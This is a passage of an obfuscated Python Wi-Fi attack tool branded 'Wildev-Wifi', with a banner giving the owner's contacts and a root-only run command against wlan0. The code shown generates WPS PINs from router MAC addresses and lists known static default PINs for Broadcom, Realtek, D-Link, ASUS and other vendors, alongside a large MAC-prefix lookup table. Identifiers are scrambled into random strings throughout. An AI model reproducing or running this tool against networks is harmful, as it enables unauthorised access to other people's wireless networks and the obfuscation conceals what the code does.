#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from typing import Dict
os.system('cls||clear')
print("""\033[1;32m
â–‘â–ˆâ–ˆâ•—â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•—â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—
â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘
â–‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•‘
â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â•šâ•â•â•â•â•â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–‘â–‘â–ˆâ–ˆâ•‘
â–‘â–‘â•šâ–ˆâ–ˆâ•”â•â–‘â•šâ–ˆâ–ˆâ•”â•â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â•šâ–ˆâ–ˆâ•”â•â–‘â•šâ–ˆâ–ˆâ•”â•â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘
â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â–‘â–‘â–‘â–‘â–‘â•šâ•â•\033[1;36m2.0
\033[1;36mâ–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬
 \033[1;37mOwner   : Willy Seviranda
 \033[1;37mTelegram : Sancrock
 \033[1;37mGithub  : Bagassamuji
 \033[1;37mWhatsapp : +6282138276519
 \033[1;31mOne line Command :
\033[1;31msudo python WILDEV-WIFI/Wildev-Wifi -i wlan0 -K
 \033[1;31mFor Help : WA-AND-TELEGRAM
 \033[1;31mNote : ROOT DEVICES ONLY
\033[1;36mâ–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬
""")
class pcJSsjVVPSuODyFgLCTRmnptzOLibOYF:
    def __init__(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        if isinstance(LbTGECbzTkRswruysYAkyIvEceyzivuI, int):
            self._int_repr = LbTGECbzTkRswruysYAkyIvEceyzivuI
            self._str_repr = self.OsjCPqzKenlCPgFENIueBnWaEMfKffpb(LbTGECbzTkRswruysYAkyIvEceyzivuI)
        elif isinstance(LbTGECbzTkRswruysYAkyIvEceyzivuI, str):
            self._str_repr = LbTGECbzTkRswruysYAkyIvEceyzivuI.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self.MUXJiNyDTRzkkwSRoieboZCxYAdSSZty(LbTGECbzTkRswruysYAkyIvEceyzivuI)
        else:
            raise ValueError('MAC address must be string or integer')
    @property
    def NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR(self):
        return self._str_repr
    @NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR.setter
    def NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR(self, value):
        self._str_repr = value
        self._int_repr = self.MUXJiNyDTRzkkwSRoieboZCxYAdSSZty(value)
    @property
    def ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC(self):
        return self._int_repr
    @ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC.setter
    def ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC(self, value):
        self._int_repr = value
        self._str_repr = self.OsjCPqzKenlCPgFENIueBnWaEMfKffpb(value)
    def __int__(self):
        return self.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC
    def __str__(self):
        return self.NWdqYFELLwZuscuMMmNSxOYCSYfTjMlR
    def __iadd__(self, other):
        self.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC += other
    def __isub__(self, other):
        self.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC -= other
    def __eq__(self, other):
        return self.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC == other.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC
    def __ne__(self, other):
        return self.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC != other.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC
    def __lt__(self, other):
        return self.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC < other.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC
    def __gt__(self, other):
        return self.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC > other.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC
    @staticmethod
    def MUXJiNyDTRzkkwSRoieboZCxYAdSSZty(LbTGECbzTkRswruysYAkyIvEceyzivuI):
        return int(LbTGECbzTkRswruysYAkyIvEceyzivuI.replace(':', ''), 16)
    @staticmethod
    def OsjCPqzKenlCPgFENIueBnWaEMfKffpb(LbTGECbzTkRswruysYAkyIvEceyzivuI):
        LbTGECbzTkRswruysYAkyIvEceyzivuI = hex(LbTGECbzTkRswruysYAkyIvEceyzivuI).split('x')[-1].upper()
        LbTGECbzTkRswruysYAkyIvEceyzivuI = LbTGECbzTkRswruysYAkyIvEceyzivuI.zfill(12)
        LbTGECbzTkRswruysYAkyIvEceyzivuI = ':'.join(LbTGECbzTkRswruysYAkyIvEceyzivuI[bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl:bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl+2] for bmDXPmyEaJsDeHeAAPKaQimhRnqbMyvl in range(0, 12, 2))
        return LbTGECbzTkRswruysYAkyIvEceyzivuI
    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)
class AisLtNShsrLJqKyyfKmfIqXcDEgBCkcV:
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2
        self.aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.jRlIABQNFuWcXcmZlHACvmvSAyxwtWGl},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.tXjKRWNjdjXpttyKcyiGMapBIwRVyfdD},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.UawREzovSqElPEnGIOvMaogEPFFvbuJx},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.cnNVlLAdmmFrCMsaUNQdOoBYRIsPFdkw},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.GNdqXcZwheMrEuHddSCihPVEjcoaYrSv},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.xpNxPiWhonkQMfWKhKfhciPRgFnOyOQR},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.YDQUqPKxvOfLRacdQgoAwfniWMwXpCDX},
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda LbTGECbzTkRswruysYAkyIvEceyzivuI: 9575521}}
    @staticmethod
    def rVRVeEimhAjJNHxnnJylZlzrwHfwzEHC(FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF):
        bNfnXXHjOUqngHOfpmUkYkCLfklDKmtL = 0
        while FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF:
            bNfnXXHjOUqngHOfpmUkYkCLfklDKmtL += (3 * (FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF % 10))
            FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = int(FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF / 10)
            bNfnXXHjOUqngHOfpmUkYkCLfklDKmtL += (FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF % 10)
            FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = int(FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF / 10)
        return (10 - bNfnXXHjOUqngHOfpmUkYkCLfklDKmtL % 10) % 10
    def hgxPRSBwrIvqPRUDLipEymzDMyHcGiCm(self, NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        LbTGECbzTkRswruysYAkyIvEceyzivuI = pcJSsjVVPSuODyFgLCTRmnptzOLibOYF(LbTGECbzTkRswruysYAkyIvEceyzivuI)
        if NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa not in self.aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE:
            raise ValueError('Invalid WPS pin algorithm')
        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = self.aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE[NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa]['gen'](LbTGECbzTkRswruysYAkyIvEceyzivuI)
        if NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa == 'pinEmpty':
            return FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF
        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF % 10000000
        FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF = str(FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF) + str(self.rVRVeEimhAjJNHxnnJylZlzrwHfwzEHC(FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF))
        return FGsvRlxMfIGwgsvdCAbrPYECxDYmfjSF.zfill(8)
    def uzwsvUmzkLWwHcTyluAyjsAPXbBSFLbz(self, LbTGECbzTkRswruysYAkyIvEceyzivuI, get_static=True):
        gxWcaANitfgieJDDEYYFCLqqnTxZaBho = []
        for ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx, NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa in self.aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE.items():
            if NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa['mode'] == self.ALGO_STATIC and not get_static:
                continue
            dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR = {}
            dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR['id'] = ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx
            if NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa['mode'] == self.ALGO_STATIC:
                dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR['name'] = 'Static PIN â€” ' + NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa['name']
            else:
                dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR['name'] = NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa['name']
            dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR['pin'] = self.hgxPRSBwrIvqPRUDLipEymzDMyHcGiCm(ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx, LbTGECbzTkRswruysYAkyIvEceyzivuI)
            gxWcaANitfgieJDDEYYFCLqqnTxZaBho.append(dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR)
        return gxWcaANitfgieJDDEYYFCLqqnTxZaBho
    def SHkXZOzCwmdmMmEyknifTtIXvjXaCeRM(self, LbTGECbzTkRswruysYAkyIvEceyzivuI, get_static=True):
        gxWcaANitfgieJDDEYYFCLqqnTxZaBho = []
        for ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx, NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa in self.aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE.items():
            if NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa['mode'] == self.ALGO_STATIC and not get_static:
                continue
            gxWcaANitfgieJDDEYYFCLqqnTxZaBho.append(self.hgxPRSBwrIvqPRUDLipEymzDMyHcGiCm(ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx, LbTGECbzTkRswruysYAkyIvEceyzivuI))
        return gxWcaANitfgieJDDEYYFCLqqnTxZaBho
    def iqWBwLTdrWbdygeJsIJEimZqVyriGMZj(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE = self.NmTakkfqZtrUizErtidGAZDMJyWlNmYt(LbTGECbzTkRswruysYAkyIvEceyzivuI)
        gxWcaANitfgieJDDEYYFCLqqnTxZaBho = []
        for ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx in aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE:
            NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa = self.aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE[ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx]
            dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR = {}
            dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR['id'] = ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx
            if NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa['mode'] == self.ALGO_STATIC:
                dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR['name'] = 'Static PIN â€” ' + NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa['name']
            else:
                dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR['name'] = NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa['name']
            dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR['pin'] = self.hgxPRSBwrIvqPRUDLipEymzDMyHcGiCm(ApVdRxdOkYJOOAQVvkHnOZuseQAzHdyx, LbTGECbzTkRswruysYAkyIvEceyzivuI)
            gxWcaANitfgieJDDEYYFCLqqnTxZaBho.append(dqXGywmtfNFTJBBlUksVwmTdvSyCoJUR)
        return gxWcaANitfgieJDDEYYFCLqqnTxZaBho
    def ivoTMuVVDOfpOITUerCnsgrrizNgVJJa(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE = self.NmTakkfqZtrUizErtidGAZDMJyWlNmYt(LbTGECbzTkRswruysYAkyIvEceyzivuI)
        gxWcaANitfgieJDDEYYFCLqqnTxZaBho = []
        for NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa in aOiSweAdsDrUSqkaKeshUQKYXAXOMLOE:
            gxWcaANitfgieJDDEYYFCLqqnTxZaBho.append(self.hgxPRSBwrIvqPRUDLipEymzDMyHcGiCm(NyAuMXxtZsScdqrhlBcDPvPQwGXAqPMa, LbTGECbzTkRswruysYAkyIvEceyzivuI))
        return gxWcaANitfgieJDDEYYFCLqqnTxZaBho
    def fUseouLYadkKdRXLtrfinWMUASstmCsr(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        gxWcaANitfgieJDDEYYFCLqqnTxZaBho = self.ivoTMuVVDOfpOITUerCnsgrrizNgVJJa(LbTGECbzTkRswruysYAkyIvEceyzivuI)
        if gxWcaANitfgieJDDEYYFCLqqnTxZaBho:
            return gxWcaANitfgieJDDEYYFCLqqnTxZaBho[0]
        else:
            return None
    def NmTakkfqZtrUizErtidGAZDMJyWlNmYt(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        LbTGECbzTkRswruysYAkyIvEceyzivuI = LbTGECbzTkRswruysYAkyIvEceyzivuI.replace(':', '').upper()
        eCoQPrLBnsXvaEigZFDTNcwKBpMtTqoI = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        gxWcaANitfgieJDDEYYFCLqqnTxZaBho = []
        for urvGENGjZYZngDHmxoUmWKdZvFioAtNl, SxcAhjVCjXCDPaAtpBAHplTvRrjlFJsN in eCoQPrLBnsXvaEigZFDTNcwKBpMtTqoI.items():
            if LbTGECbzTkRswruysYAkyIvEceyzivuI.startswith(SxcAhjVCjXCDPaAtpBAHplTvRrjlFJsN):
                gxWcaANitfgieJDDEYYFCLqqnTxZaBho.append(urvGENGjZYZngDHmxoUmWKdZvFioAtNl)
        return gxWcaANitfgieJDDEYYFCLqqnTxZaBho
    def jRlIABQNFuWcXcmZlHACvmvSAyxwtWGl(self, LbTGECbzTkRswruysYAkyIvEceyzivuI):
        return LbTGECbzTkRswruysYAkyIvEceyzivuI.ZHsdZEfXKYWnOdTpyDovyvTMAlKBzEiC & 0xFFFFFF
